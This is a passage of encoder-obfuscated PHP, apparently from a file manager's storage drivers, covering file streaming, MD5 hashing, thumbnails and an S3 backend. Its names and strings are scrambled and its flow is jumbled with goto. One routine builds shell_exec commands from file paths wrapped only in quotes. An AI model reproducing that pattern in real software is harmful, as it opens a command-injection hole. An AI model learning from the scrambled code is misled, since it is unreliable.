$_SERVER[¢ÌÛ]; if (!$EïƒöÀØ—„) { return md5($E­ˆ»‹…ù×[33]); } $EÌÒ®ï”ä = $this->size($EïƒöÀØ—„); goto e£œ¢ŒèÖƒ; cÎŞÀ’›: } public static $md5Cache = array(); public function hashMd5($cÚ÷à²µŠÃ) { $cÚ÷à²µŠÃ = $this->iconvSystem($cÚ÷à²µŠÃ); if (isset(self::$md5Cache[$cÚ÷à²µŠÃ])) { return self::$md5Cache[$cÚ÷à²µŠÃ]; } self::$md5Cache[$cÚ÷à²µŠÃ] = $this->hashMd5Shell($cÚ÷à²µŠÃ); if (!self::$md5Cache[$cÚ÷à²µŠÃ]) { self::$md5Cache[$cÚ÷à²µŠÃ] = @md5_file($cÚ÷à²µŠÃ); } return self::$md5Cache[$cÚ÷à²µŠÃ]; } private function hashMd5Shell($eÊØÉ¥Ã÷Ê) { goto d¬…Ó²Óº; d”»¸šæíõ: $a»Æ¦»ƒĞĞ = shell_exec($bšÕ¾È†Ìº . "\x20\x22{$eÊØÉ¥Ã÷Ê}\x22"); $a»Æ¦»ƒĞĞ = str_replace($fóßäª³š[103], $fóßäª³š[33], $a»Æ¦»ƒĞĞ); return substr($a»Æ¦»ƒĞĞ, 0, 32); goto e—ë±øí¯; d¬…Ó²Óº: $fóßäª³š =& $_SERVER[¢ÌÛ]; if (!function_exists($fóßäª³š[97])) { return !1; } $Bø¬“Šìš = array($fóßäª³š[98], $fóßäª³š[99]); goto A©†Ş§Ğçî; A©†Ş§Ğçî: $bšÕ¾È†Ìº = Cache::get($fóßäª³š[100]); if (!$bšÕ¾È†Ìº) { $bØ¾¹İØ = BASIC_PATH . $fóßäª³š[101]; $AÂ™¦Âëô« = md5_file($bØ¾¹İØ); $bšÕ¾È†Ìº = $fóßäª³š[102]; foreach ($Bø¬“Šìš as $Aè“¾©¶ò’) { $a»Æ¦»ƒĞĞ = shell_exec($Aè“¾©¶ò’ . "\x20\42{$bØ¾¹İØ}\x22"); if ($a»Æ¦»ƒĞĞ && substr(trim($a»Æ¦»ƒĞĞ), 0, 32) == $AÂ™¦Âëô«) { $bšÕ¾È†Ìº = $Aè“¾©¶ò’; break; } } Cache::set($fóßäª³š[100], $bšÕ¾È†Ìº, 3600); } if ($bšÕ¾È†Ìº == $fóßäª³š[102]) { return !1; } goto d”»¸šæíõ; e—ë±øí¯: } public function link($A‹ğªòÀİÜ) { return $A‹ğªòÀİÜ; } public function fileOut($Fùáöš ï, $d«˜àˆœÂ¸ = false, $F•ëÎ š¸ = false, $EŠòªáÒÁ¯ = '') { goto AÖò—ùÖòš; eÛôÆ¬é‰: $EáÅ±äµŞ = strtolower($_SERVER[$d§ãßÚÔŒä[141]]); if ($B—Œ £æì¥ && $EáÅ±äµŞ && $eÕ´¸îëÛÕ) { if (strstr($EáÅ±äµŞ, $d§ãßÚÔŒä[142])) { header($d§ãßÚÔŒä[143] . $Fùáöš ï); } else { if (strstr($EáÅ±äµŞ, $d§ãßÚÔŒä[144])) { header($d§ãßÚÔŒä[145] . $Fùáöš ï); } else { if (strstr($EáÅ±äµŞ, $d§ãßÚÔŒä[146])) { header($d§ãßÚÔŒä[147] . $Fùáöš ï); } } } if ($EëİÎø»Óì) { header($d§ãßÚÔŒä[148] . $EëİÎø»Óì); } return; } if (isset($_SERVER[$d§ãßÚÔŒä[149]])) { if (preg_match($d§ãßÚÔŒä[150], $_SERVER[$d§ãßÚÔŒä[149]], $D„½ÇÔí›)) { $dë’æ¹Ì¿ = intval($D„½ÇÔí›[1]); if (!empty($D„½ÇÔí›[2])) { $E“‹†‘çƒŠ = intval($D„½ÇÔí›[2]); } } header($d§ãßÚÔŒä[151]); header("\x43\157\156\x74\x65\x6e\x74\55\122\141\x6e\147\x65\x3a\40\x62\x79\x74\145\x73\x20{$dë’æ¹Ì¿}\x2d{$E“‹†‘çƒŠ}\x2f" . $c’ô‘™´); } else { header($d§ãßÚÔŒä[152]); } goto AİÜƒË¡; d’Î±ÒÒ…: header($d§ãßÚÔŒä[127]); header($d§ãßÚÔŒä[128]); header($d§ãßÚÔŒä[129]); goto F•™›§Ø‚˜; E²¼àÍË‰: @ob_end_clean(); set_timeout(); $D—ØíŞ¸Ÿ = $this->infoFull($Fùáöš ï); goto EÆëÊ…‡™; FìÂ“ˆîÓ“: $Bß—­ËÌé = get_file_mime($aŞ½ºäÆÖÎ); if (strstr($Bß—­ËÌé, $d§ãßÚÔŒä[116])) { $Bß—­ËÌé = $Bß—­ËÌé . $d§ãßÚÔŒä[117]; } if ($d«˜àˆœÂ¸ === !1 && !mime_support($Bß—­ËÌé)) { $d«˜àˆœÂ¸ = !0; $Bß—­ËÌé = $d§ãßÚÔŒä[118]; } goto eÔ“Æ³„ Œ; EÆëÊ…‡™: $c’ô‘™´ = $D—ØíŞ¸Ÿ[$d§ãßÚÔŒä[77]]; $AÔ°àÅ®¼ = gmdate($d§ãßÚÔŒä[109], $D—ØíŞ¸Ÿ[$d§ãßÚÔŒä[83]]); $bÕë‰¸Ñ°Æ = $F•ëÎ š¸ ? $F•ëÎ š¸ : $this->iconvApp($D—ØíŞ¸Ÿ[$d§ãßÚÔŒä[28]]); goto b²¹±†¥ÅÙ; eš‘•Ô³å³: if ($EëİÎø»Óì) { $E™ŠÚ¤ÜÏ = intval(1000 * 1000 * ($E¡µ·ô±² / $EëİÎø»Óì)); } while ($dë’æ¹Ì¿ <= $E“‹†‘çƒŠ) { $FÂàÌêèŠ = timeFloat(); check_abort(); $a°ñÛ¨éßÀ = $E“‹†‘çƒŠ - $dë’æ¹Ì¿ + 1; if ($a°ñÛ¨éßÀ <= $E¡µ·ô±²) { $E¡µ·ô±² = $a°ñÛ¨éßÀ; } echo $this->fileSubstr($Fùáöš ï, $dë’æ¹Ì¿, $E¡µ·ô±²); $dë’æ¹Ì¿ += $E¡µ·ô±²; if ($E¡µ·ô±² == $a°ñÛ¨éßÀ) { $dë’æ¹Ì¿ = $E“‹†‘çƒŠ + 1; } if ($E™ŠÚ¤ÜÏ) { $bÑí¦çİİ = intval(1000 * 1000 * (timeFloat() - $FÂàÌêèŠ)); $dŸƒù˜œ¯Ï = $E™ŠÚ¤ÜÏ - $bÑí¦çİİ; if ($dŸƒù˜œ¯Ï > 5) { usleep($dŸƒù˜œ¯Ï); } } } goto fº°§íãÊ; eÔ“Æ³„ Œ: header($d§ãßÚÔŒä[119]); header($d§ãßÚÔŒä[120] . $Bß—­ËÌé); $DÜ¯À¿äÜ = rawurlencode($bÕë‰¸Ñ°Æ); goto b…Ä¡´¦ù; AİÜƒË¡: $E©æƒ•ƒ…Ó = !0; if ($_SERVER[$d§ãßÚÔŒä[153]] == $d§ãßÚÔŒä[154] && $c’ô‘™´ > 1204 * 1024 * 1024 * 2) { $E©æƒ•ƒ…Ó = !1; } if ($E©æƒ•ƒ…Ó) { header($d§ãßÚÔŒä[155] . ($E“‹†‘çƒŠ - $dë’æ¹Ì¿ + 1)); } goto bÑáóº³«ß; F•™›§Ø‚˜: if (isset($_SERVER[$d§ãßÚÔŒä[130]]) && strtotime($_SERVER[$d§ãßÚÔŒä[130]]) == $D—ØíŞ¸Ÿ[$d§ãßÚÔŒä[83]]) { header($d§ãßÚÔŒä[131], !0, 304); die; } if (isset($_SERVER[$d§ãßÚÔŒä[132]]) && $_SERVER[$d§ãßÚÔŒä[132]] == $EŠòªáÒÁ¯) { header($d§ãßÚÔŒä[133] . $EŠòªáÒÁ¯, !0, 304); die; } header($d§ãßÚÔŒä[133] . $EŠòªáÒÁ¯); goto d¶¶ë¤; bÑáóº³«ß: if ($_SERVER[$d§ãßÚÔŒä[156]] == $d§ãßÚÔŒä[157]) { return; } $E¡µ·ô±² = 1024 * 100; $E™ŠÚ¤ÜÏ = 0; goto eš‘•Ô³å³; FùâÉÛÆ»¿: if (in_array($aŞ½ºäÆÖÎ, array($d§ãßÚÔŒä[110], $d§ãßÚÔŒä[111], $d§ãßÚÔŒä[112], $d§ãßÚÔŒä[113]))) { $aŞ½ºäÆÖÎ = $d§ãßÚÔŒä[114]; } if (!$EŠòªáÒÁ¯) { $EŠòªáÒÁ¯ = md5($AÔ°àÅ®¼ . $this->hashSimple($Fùáöš ï)); } $EŠòªáÒÁ¯ = $d§ãßÚÔŒä[115] . $EŠòªáÒÁ¯ . $d§ãßÚÔŒä[115]; goto FìÂ“ˆîÓ“; b²¹±†¥ÅÙ: $dë’æ¹Ì¿ = 0; $E“‹†‘çƒŠ = $c’ô‘™´ - 1; $aŞ½ºäÆÖÎ = $this->ext($bÕë‰¸Ñ°Æ); goto FùâÉÛÆ»¿; b…Ä¡´¦ù: $DÜ¯À¿äÜ = $d§ãßÚÔŒä[115] . $DÜ¯À¿äÜ . $d§ãßÚÔŒä[121] . $DÜ¯À¿äÜ; if ($d«˜àˆœÂ¸) { header($d§ãßÚÔŒä[122]); header($d§ãßÚÔŒä[123] . $DÜ¯À¿äÜ); } else { header($d§ãßÚÔŒä[124] . $DÜ¯À¿äÜ); } header($d§ãßÚÔŒä[125] . gmdate($d§ãßÚÔŒä[109], time() + 3600 * 24 * 30) . $d§ãßÚÔŒä[126]); goto d’Î±ÒÒ…; d¶¶ë¤: header($d§ãßÚÔŒä[134] . $AÔ°àÅ®¼ . $d§ãßÚÔŒä[126]); header($d§ãßÚÔŒä[135] . $bÕë‰¸Ñ°Æ); header($d§ãßÚÔŒä[136]); goto cæõÉ”Àå¿; AÖò—ùÖòš: $d§ãßÚÔŒä =& $_SERVER[¢ÌÛ]; $this->cacheMethod(null, null); if (!$Fùáöš ï || !$this->exist($Fùáöš ï)) { show_json(LNG($d§ãßÚÔŒä[104]), !1, $F•ëÎ š¸); } goto fêØùÃ¿±¤; fêØùÃ¿±¤: $B—Œ £æì¥ = $this->getType() == $d§ãßÚÔŒä[105]; $eÕ´¸îëÛÕ = $GLOBALS[$d§ãßÚÔŒä[6]][$d§ãßÚÔŒä[87]][$d§ãßÚÔŒä[106]][$d§ãßÚÔŒä[107]]; $EëİÎø»Óì = (double) $GLOBALS[$d§ãßÚÔŒä[6]][$d§ãßÚÔŒä[87]][$d§ãßÚÔŒä[106]][$d§ãßÚÔŒä[108]] * 1024 * 1024; goto E²¼àÍË‰; cæõÉ”Àå¿: header($d§ãßÚÔŒä[137] . $c’ô‘™´); header($d§ãßÚÔŒä[138]); if (!$d«˜àˆœÂ¸ && $aŞ½ºäÆÖÎ == $d§ãßÚÔŒä[139]) { if ($c’ô‘™´ > 1024 * 1024 * 5) { die; } $EôÓªŞÄ†… = $this->getContent($Fùáöš ï); $EôÓªŞÄ†… = Html::clearSVG($EôÓªŞÄ†…); header($d§ãßÚÔŒä[140] . strlen($EôÓªŞÄ†…)); echo $EôÓªŞÄ†…; die; } goto eÛôÆ¬é‰; fº°§íãÊ: } public function fileOutServer($bô§‚ˆÄÇ, $có§“ÖÔóË = false, $E±ˆÉŠåÚô = false, $fÀ­Æ¨ÏÙÏ = '') { $this->fileOut($bô§‚ˆÄÇ, $có§“ÖÔóË, $E±ˆÉŠåÚô, $fÀ­Æ¨ÏÙÏ); } public function fileOutLink($A’£‡ŠŒÖ) { header($_SERVER[¢ÌÛ][158] . $A’£‡ŠŒÖ); die; } public function cacheMethod($fİÎöŞÄÈì, $C¬‹Óöß¼±, $FõÆì«†¾œ = null) { goto BÁ™¹šŠóœ; B…“Æš¢ã: $dÓÌºŒ¾ÖØ = $this->{$fİÎöŞÄÈì}($C¬‹Óöß¼±); $Dµ˜æ½Ä”ö[$FºŸ±èÌ›] = $dÓÌºŒ¾ÖØ; return $dÓÌºŒ¾ÖØ; goto E÷‹ÉšÓšË; CšêÓÓÕ‡ƒ: $FºŸ±èÌ› = $B„ìßÔŸ¶¥[159] . $fİÎöŞÄÈì . $B„ìßÔŸ¶¥[160] . rtrim($FùÆé¾‚áÅ, $B„ìßÔŸ¶¥[8]); if (is_null($fİÎöŞÄÈì)) { $Dµ˜æ½Ä”ö = array(); return; } if (is_null($C¬‹Óöß¼±)) { unset($Dµ˜æ½Ä”ö[$FºŸ±èÌ›]); return; } goto b ä¤õ–˜†; BÁ™¹šŠóœ: $B„ìßÔŸ¶¥ =& $_SERVER[¢ÌÛ]; static $Dµ˜æ½Ä”ö = array(); $FùÆé¾‚áÅ = $C¬‹Óöß¼± ? ltrim($this->getPathOuter($C¬‹Óöß¼±), $B„ìßÔŸ¶¥[8]) : $C¬‹Óöß¼±; goto CšêÓÓÕ‡ƒ; b ä¤õ–˜†: if (!is_null($FõÆì«†¾œ)) { $Dµ˜æ½Ä”ö[$FºŸ±èÌ›] = $FõÆì«†¾œ; return; } $dÓÌºŒ¾ÖØ = isset($Dµ˜æ½Ä”ö[$FºŸ±èÌ›]) ? $Dµ˜æ½Ä”ö[$FºŸ±èÌ›] : null; if (!is_null($dÓÌºŒ¾ÖØ)) { return $dÓÌºŒ¾ÖØ; } goto B…“Æš¢ã; E÷‹ÉšÓšË: } public function fileOutImage($fÏ¦ì…ªÍä, $CëöéĞõ™ = 250) { goto dÛõ­Ùïø§; dÛõ­Ùïø§: $cøùí³Š½ô =& $_SERVER[¢ÌÛ]; if (substr($fÏ¦ì…ªÍä, 0, 4) == $cøùí³Š½ô[146]) { $this->fileOutLink($fÏ¦ì…ªÍä); } $eÈè ó˜‚ = $this->info($fÏ¦ì…ªÍä); goto fÑ¸‹ŠÁÂê; fÑ¸‹ŠÁÂê: $b‡È¼¶Ú¨Î = $eÈè ó˜‚[$cøùí³Š½ô[28]]; $EÙÒÄÅ…¥ì = !1; if (isset($GLOBALS[$cøùí³Š½ô[161]]) && $GLOBALS[$cøùí³Š½ô[161]][$cøùí³Š½ô[75]] == $eÈè ó˜‚[$cøùí³Š½ô[75]]) { $E”—¬ÛÏ”¯ = $GLOBALS[$cøùí³Š½ô[161]][$cøùí³Š½ô[162]]; if (!$eÈè ó˜‚[$cøùí³Š½ô[163]]) { $eÈè ó˜‚[$cøùí³Š½ô[163]] = $GLOBALS[$cøùí³Š½ô[161]]; } if (isset($E”—¬ÛÏ”¯[$cøùí³Š½ô[164]])) { if ($E”—¬ÛÏ”¯[$cøùí³Š½ô[164]] <= $CëöéĞõ™ && $E”—¬ÛÏ”¯[$cøùí³Š½ô[165]] <= $CëöéĞõ™) { $EÙÒÄÅ…¥ì = !0; } } $b‡È¼¶Ú¨Î = $eÈè ó˜‚[$cøùí³Š½ô[163]][$cøùí³Š½ô[28]]; } goto DÍÂöÌÙäº; E½Ë³‰Ö—: if (!file_exists($E«³ƒ¢ÇÊ) || filesize($E«³ƒ¢ÇÊ) < 100) { return @file_exists($DÂŸêÊíŠ) ? IO::fileOut($DÂŸêÊíŠ) : $this->fileOut($fÏ¦ì…ªÍä); } if (!($Dášğì£å• = IO::move($E«³ƒ¢ÇÊ, $B×Ú“˜È‚©))) { return IO::fileOut($E«³ƒ¢ÇÊ); } del_file($E«³ƒ¢ÇÊ); goto c¹åÖ‚–‡Û; c¹åÖ‚–‡Û: IO::fileOut($Dášğì£å•); goto b­È¡§©§—; A”ÖÙÖ™„Æ: $E«³ƒ¢ÇÊ = DATA_THUMB . $fÕ×õŞÉ‚„; del_file($E«³ƒ¢ÇÊ); if (!@file_exists($E«³ƒ¢ÇÊ)) { $EÈ ‹•£„¤ = TEMP_FILES; if (!is_dir($EÈ ‹•£„¤)) { mk_dir($EÈ ‹•£„¤); } $DÂŸêÊíŠ = $EÈ ‹•£„¤ . $B‡õ¢âçÆ . $cøùí³Š½ô[94] . $eÈè ó˜‚[$cøùí³Š½ô[167]]; if (!@file_exists($DÂŸêÊíŠ)) { $DÂŸêÊíŠ = $this->download($fÏ¦ì…ªÍä, $DÂŸêÊíŠ); } $cõšê©ëÃ = new ImageThumb($DÂŸêÊíŠ, $cøùí³Š½ô[173]); $cõšê©ëÃ->prorate($E«³ƒ¢ÇÊ, $CëöéĞõ™, $CëöéĞõ™ * 10); } goto E½Ë³‰Ö—; DÍÂöÌÙäº: if ($eÈè ó˜‚[$cøùí³Š½ô[77]] <= 1024 * 50 || $EÙÒÄÅ…¥ì || !function_exists($cøùí³Š½ô[166]) || $eÈè ó˜‚[$cøùí³Š½ô[167]] == $cøùí³Š½ô[168]) { return $this->fileOut($fÏ¦ì…ªÍä, !1, $b‡È¼¶Ú¨Î); } if (isset($eÈè ó˜‚[$cøùí³Š½ô[163]][$cøùí³Š½ô[169]])) { $B‡õ¢âçÆ = $eÈè ó˜‚[$cøùí³Š½ô[163]][$cøùí³Š½ô[169]]; } else { if (isset($eÈè ó˜‚[$cøùí³Š½ô[163]][$cøùí³Š½ô[170]])) { $B‡õ¢âçÆ = $eÈè ó˜‚[$cøùí³Š½ô[163]][$cøùí³Š½ô[170]]; } else { $B‡õ¢âçÆ = md5("{$eÈè ó˜‚[$cøùí³Š½ô[28]]}\137{$eÈè ó˜‚[$cøùí³Š½ô[75]]}\137{$eÈè ó˜‚[$cøùí³Š½ô[77]]}"); } } $fÕ×õŞÉ‚„ = "{$B‡õ¢âçÆ}\x5f{$CëöéĞõ™}\56\x70\156\147"; goto f¯£ä…°ïé; f¯£ä…°ïé: if (!($A¢ä¢ÌÖ´ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $cøùí³Š½ô[171]))) { $B×Ú“˜È‚© = IO::mkdir(IO_PATH_SYSTEM_TEMP . $cøùí³Š½ô[172]); } else { $B×Ú“˜È‚© = KodIO::make($A¢ä¢ÌÖ´); } if ($A¢ä¢ÌÖ´ = IO::fileNameExist($B×Ú“˜È‚©, $fÕ×õŞÉ‚„)) { $E«³ƒ¢ÇÊ = KodIO::make($A¢ä¢ÌÖ´); return IO::fileOut($E«³ƒ¢ÇÊ, !1, $b‡È¼¶Ú¨Î); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto A”ÖÙÖ™„Æ; b­È¡§©§—: } public function fileOutImageServer($FÔùœ¨ËµÓ, $dÙíë¦õÛ¦ = 250) { $this->fileOutImage($FÔùœ¨ËµÓ, $dÙíë¦õÛ¦); } public function fileNameAuto($A‹Í’‘Å‹¡, $e÷Ÿ‘©ôÆí, $DÅæêùÅ–â = REPEAT_RENAME, $C‹îíá”Ò = false) { goto D×¤ğÄ‚æ„; eÒˆ‚¤µ: $b¹¯ÍµßÙõ = 1; $C›Èˆ„¨Ë = substr($e÷Ÿ‘©ôÆí, 0, strlen($e÷Ÿ‘©ôÆí) - strlen($b°çÛ›Î°)); $EòÇ¹¨†ñ = $C›Èˆ„¨Ë . "\x28{$b¹¯ÍµßÙõ}\51{$b°çÛ›Î°}"; goto AÜš³ëÀ; AÜš³ëÀ: while ($this->exist(rtrim($A‹Í’‘Å‹¡, $e²íƒä¹¸[8]) . $e²íƒä¹¸[8] . $EòÇ¹¨†ñ)) { $EòÇ¹¨†ñ = $C›Èˆ„¨Ë . "\x28{$b¹¯ÍµßÙõ}\51{$b°çÛ›Î°}"; $b¹¯ÍµßÙõ++; } return $EòÇ¹¨†ñ; goto b¨®ê×‚ÊÂ; bŞ±É¬åˆÈ: if ($DÅæêùÅ–â == REPEAT_SKIP) { return !1; } $b°çÛ›Î° = $e²íƒä¹¸[94] . get_path_ext($e÷Ÿ‘©ôÆí); $b°çÛ›Î° = $b°çÛ›Î° == $e²íƒä¹¸[94] || $C‹îíá”Ò ? $e²íƒä¹¸[33] : $b°çÛ›Î°; goto eÒˆ‚¤µ; D×¤ğÄ‚æ„: $e²íƒä¹¸ =& $_SERVER[¢ÌÛ]; $e›óÕ†êƒÂ = $A‹Í’‘Å‹¡ === $e²íƒä¹¸[33] ? $e÷Ÿ‘©ôÆí : rtrim($A‹Í’‘Å‹¡, $e²íƒä¹¸[8]) . $e²íƒä¹¸[8] . $e÷Ÿ‘©ôÆí; if ($DÅæêùÅ–â == REPEAT_REPLACE || !$this->exist($e›óÕ†êƒÂ) || $C‹îíá”Ò && $DÅæêùÅ–â != REPEAT_RENAME_FOLDER) { return $e÷Ÿ‘©ôÆí; } goto bŞ±É¬åˆÈ; b¨®ê×‚ÊÂ: } public function listAllFiles($Eó¸ºö¦‹, $EÉ˜‰šóíø, $Fƒİ—Ğ§½¦ = array()) { goto Bƒ–ÏÎÚƒÜ; Cµöç’¿Õ¦: $Eó¸ºö¦‹ = trim($Eó¸ºö¦‹, $a¡İ‚Šë[8]); foreach ($EÉ˜‰šóíø as $FÒÆµÖËŒ) { $A©Êô³³ˆŒ = ltrim(substr(trim($FÒÆµÖËŒ, $a¡İ‚Šë[8]), strlen($Eó¸ºö¦‹)), $a¡İ‚Šë[8]); $C­è£•õ‡ = array_merge($C­è£•õ‡, $this->slicePath($A©Êô³³ˆŒ)); } $a‘‹î†ÇŠİ = array(); goto fÓ÷ºì»»–; fÓ÷ºì»»–: foreach (array_unique($C­è£•õ‡) as $FÒÆµÖËŒ) { $eÙÜ¥Š½î = array($a¡İ‚Šë[75] => $this->getPathOuter($a¡İ‚Šë[8] . $Eó¸ºö¦‹ . $a¡İ‚Šë[8] . $FÒÆµÖËŒ), $a¡İ‚Šë[76] => 1, $a¡İ‚Šë[77] => 0); if (substr($FÒÆµÖËŒ, -1) != $a¡İ‚Šë[8]) { $eÙÜ¥Š½î[$a¡İ‚Šë[76]] = 0; $BÍ‹îº‹˜ˆ = $this->getPath($Eó¸ºö¦‹ . $a¡İ‚Šë[8] . $FÒÆµÖËŒ); $eÙÜ¥Š½î[$a¡İ‚Šë[77]] = isset($Fƒİ—Ğ§½¦[$BÍ‹îº‹˜ˆ]) ? $Fƒİ—Ğ§½¦[$BÍ‹îº‹˜ˆ] : $this->size($BÍ‹îº‹˜ˆ); } $a‘‹î†ÇŠİ[] = $eÙÜ¥Š½î; } return $a‘‹î†ÇŠİ; goto b‚ğ¬ÚäÖ; Bƒ–ÏÎÚƒÜ: $a¡İ‚Šë =& $_SERVER[¢ÌÛ]; if (empty($EÉ˜‰šóíø)) { return array(); } $C­è£•õ‡ = array(); goto Cµöç’¿Õ¦; b‚ğ¬ÚäÖ: } public function slicePath($eá¸öÊ•²Ï) { $dØâÙ›­‹ˆ =& $_SERVER[¢ÌÛ]; $AôĞ¨…íÛ• = explode($dØâÙ›­‹ˆ[8], trim($eá¸öÊ•²Ï, $dØâÙ›­‹ˆ[8])); $FÜ¥µôò‹ = 0; do { ++$FÜ¥µôò‹; $DÒÑğˆ¾§¨[] = implode($dØâÙ›­‹ˆ[8], array_slice($AôĞ¨…íÛ•, 0, $FÜ¥µôò‹)) . $dØâÙ›­‹ˆ[8]; } while ($FÜ¥µôò‹ < count($AôĞ¨…íÛ•)); $DÒÑğˆ¾§¨[count($AôĞ¨…íÛ•) - 1] = $eá¸öÊ•²Ï; return $DÒÑğˆ¾§¨; } public function getHost() { $CêÁ¶Û†ˆ‘ =& $_SERVER[¢ÌÛ]; $e‚áøÉ¸¿‹ = parse_url(trim($this->domain, $CêÁ¶Û†ˆ‘[8])); $d†‹´ê‹Ùí = isset($e‚áøÉ¸¿‹[$CêÁ¶Û†ˆ‘[174]]) ? $e‚áøÉ¸¿‹[$CêÁ¶Û†ˆ‘[174]] : http_type(); $F¦„Å­ß³ˆ = isset($e‚áøÉ¸¿‹[$CêÁ¶Û†ˆ‘[175]]) ? $e‚áøÉ¸¿‹[$CêÁ¶Û†ˆ‘[175]] : $e‚áøÉ¸¿‹[$CêÁ¶Û†ˆ‘[75]]; if (isset($e‚áøÉ¸¿‹[$CêÁ¶Û†ˆ‘[176]])) { $F¦„Å­ß³ˆ .= $CêÁ¶Û†ˆ‘[4] . $e‚áøÉ¸¿‹[$CêÁ¶Û†ˆ‘[176]]; } return $d†‹´ê‹Ùí . $CêÁ¶Û†ˆ‘[177] . $F¦„Å­ß³ˆ; } public function pathEncode($F°‚ßÌ‚Èˆ) { $aîƒé’¶Å¤ =& $_SERVER[¢ÌÛ]; return str_replace($aîƒé’¶Å¤[178], $aîƒé’¶Å¤[8], rawurlencode($F°‚ßÌ‚Èˆ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($d×Áç¤—Ì) { set_timeout(); require_once SDK_DIR . $_SERVER[¢ÌÛ][179]; parent::__construct(); $this->_init($d×Áç¤—Ì); } public function _init($cÃ¢¬ÂŞ¤ñ) { foreach ($cÃ¢¬ÂŞ¤ñ as $fÙ§µˆ‚ => $f©ºïõš¾) { if (isset($this->{$fÙ§µˆ‚})) { $this->{$fÙ§µˆ‚} = $f©ºïõš¾; } } $this->endpoint = $cÃ¢¬ÂŞ¤ñ[$_SERVER[¢ÌÛ][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Då‘¬ªÈœÚ = "\x76\64") { $this->signVer = $Då‘¬ªÈœÚ; $this->client->setSignatureVersion($Då‘¬ªÈœÚ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto d’˜Üœß‹; d©ÓŞˆÔŞß: $bÍ’¤ÏïªÕ = array($eª½ÍŞ¿‚Ÿ[186], $eª½ÍŞ¿‚Ÿ[187], $eª½ÍŞ¿‚Ÿ[188], $eª½ÍŞ¿‚Ÿ[189], $eª½ÍŞ¿‚Ÿ[190]); $dÔš‚˜ÆËÄ = array_diff($bÍ’¤ÏïªÕ, $AÃ‚…â¾î«); return empty($dÔš‚˜ÆËÄ); goto C†Ã°Ãß; d’˜Üœß‹: $eª½ÍŞ¿‚Ÿ =& $_SERVER[¢ÌÛ]; $aš·‰ŸÅÒ¡ = $this->getBucketCors(); if (!$aš·‰ŸÅÒ¡ || !is_array($aš·‰ŸÅÒ¡)) { return !1; } goto AŒ´—£öß¾; AŒ´—£öß¾: if ($aš·‰ŸÅÒ¡[$eª½ÍŞ¿‚Ÿ[181]] != $eª½ÍŞ¿‚Ÿ[182] || $aš·‰ŸÅÒ¡[$eª½ÍŞ¿‚Ÿ[183]] != $eª½ÍŞ¿‚Ÿ[182]) { return !1; } $AÃ‚…â¾î« = array_map($eª½ÍŞ¿‚Ÿ[184], $aš·‰ŸÅÒ¡[$eª½ÍŞ¿‚Ÿ[185]]); if (!is_array($AÃ‚…â¾î«)) { $AÃ‚…â¾î« = array(); } goto d©ÓŞˆÔŞß; C†Ã°Ãß: } public function mkfile($aÉÛƒ‚¿éÛ, $dÈ ¹¾Ìêˆ = '', $AÄäº§šœš = REPEAT_RENAME) { $d—é õ×£‰ = $this->setContent($aÉÛƒ‚¿éÛ, $dÈ ¹¾Ìêˆ); if ($d—é õ×£‰ !== !1) { return $this->getPathOuter($aÉÛƒ‚¿éÛ); } return !1; } public function mkdir($A˜áŒ¤õ, $fÏ Ã‹”‹ = REPEAT_SKIP) { if (empty($A˜áŒ¤õ)) { return !1; } if ($this->_isFolder($A˜áŒ¤õ)) { return $this->getPathOuter($A˜áŒ¤õ); } $f¾ÜÀ¦§èö = $this->setContent($A˜áŒ¤õ, $_SERVER[¢ÌÛ][33], !0); if ($f¾ÜÀ¦§èö !== !1) { return $this->getPathOuter($A˜áŒ¤õ); } return !1; } public function copyFile($AÚ¬ßß¾ƒì, $Eˆô½Ú¿¹¼, $F‚—¤¢Ìæ = array()) { $A™¨¦É¥–ó =& $_SERVER[¢ÌÛ]; $Bš§¦Å— = $this->objectMeta($AÚ¬ßß¾ƒì); if (!$Bš§¦Å—) { return !1; } if ($Bš§¦Å—[$A™¨¦É¥–ó[77]] <= 1024 * 1024 * 200) { $D§°”ìáêß = $this->client->copyObject($this->bucket, $AÚ¬ßß¾ƒì, $this->bucket, $Eˆô½Ú¿¹¼, $A™¨¦É¥–ó[191], $F‚—¤¢Ìæ); } else { $D§°”ìáêß = $this->client->multiCopyObject($this->bucket, $AÚ¬ßß¾ƒì, $this->bucket, $Eˆô½Ú¿¹¼, $F‚—¤¢Ìæ); } $D§°”ìáêß = $D§°”ìáêß ? $this->getPathOuter($Eˆô½Ú¿¹¼) : !1; return $D§°”ìáêß; } public function moveFile($cö õ×‹´, $D»÷–ƒ÷áÚ) { if ($this->copyFile($cö õ×‹´, $D»÷–ƒ÷áÚ)) { $this->delFile($cö õ×‹´); return $this->getPathOuter($D»÷–ƒ÷áÚ); } return !1; } public function delFile($Eó¤Ùğ µğ) { return $this->client->deleteObject($this->bucket, $Eó¤Ùğ µğ); } public function delFolder($cñÕ×¥É) { goto A‰”ÒºÓ¹; A‰”ÒºÓ¹: $c¯ŠŠŸ™Í =& $_SERVER[¢ÌÛ]; if (!$this->exist($cñÕ×¥É)) { return !0; } $this->listItemCache = !1; goto aÍê’…â¾; CÉèÅ”‹ÇÄ: return $this->delByBatch($AŒë²ÔÙ[$c¯ŠŠŸ™Í[74]]); goto DˆÁ‡Ê‹Ş£; aÍê’…â¾: $AŒë²ÔÙ = $this->fileList($cñÕ×¥É); $this->listItemCache = !0; $fÙÒ«äº™© = trim($cñÕ×¥É, $c¯ŠŠŸ™Í[8]) . $c¯ŠŠŸ™Í[8]; goto bº‚ºì®‰; bº‚ºì®‰: if (!empty($cñÕ×¥É) && !in_array($fÙÒ«äº™©, $AŒë²ÔÙ[$c¯ŠŠŸ™Í[74]])) { $AŒë²ÔÙ[$c¯ŠŠŸ™Í[74]][] = $fÙÒ«äº™©; } $d«ÖÖ–Ó†Æ = $this->delByBatch($AŒë²ÔÙ[$c¯ŠŠŸ™Í[73]]); if (!$d«ÖÖ–Ó†Æ) { return !1; } goto CÉèÅ”‹ÇÄ; DˆÁ‡Ê‹Ş£: } private function 